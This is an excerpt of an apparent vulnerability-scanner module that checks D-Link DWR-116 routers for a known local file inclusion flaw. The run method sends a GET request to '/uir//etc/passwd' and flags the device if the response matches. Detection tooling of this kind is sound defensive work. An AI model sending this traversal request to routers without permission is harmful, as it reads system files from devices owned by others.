#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link routers DWR-116 through 1."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link Routers - Local File Inclusion Detection',
        ...
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'dlink', 'edb', 'seclists', 'lfi', 'router', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/uir//etc/passwd', allow_redirects=False)
        ...
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="D-Link Routers - Local File Inclusion detected",
                path='/uir//etc/passwd',
            )
            return True
        return False
